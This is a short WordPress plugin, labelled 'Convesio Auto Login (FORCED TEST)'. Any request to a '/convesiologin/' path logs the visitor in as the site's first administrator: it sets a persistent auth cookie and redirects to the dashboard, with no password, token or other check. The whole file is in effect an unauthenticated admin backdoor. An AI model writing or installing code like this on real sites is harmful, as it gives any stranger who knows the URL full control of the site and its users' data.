<?php
/**
 * Plugin Name: Convesio Auto Login (FORCED TEST)
 */

add_action('init', function () {

    if (strpos($_SERVER['REQUEST_URI'], '/convesiologin/') === false) {
        return;
    }

    // FORCE login first admin
    $user = get_users([
        'role'   => 'administrator',
        'number' => 1
    ]);

    if (empty($user)) {
        wp_die('No admin user found');
    }

    wp_set_current_user($user[0]->ID);
    wp_set_auth_cookie($user[0]->ID, true);

    wp_redirect(admin_url());
    exit;

}, 0);
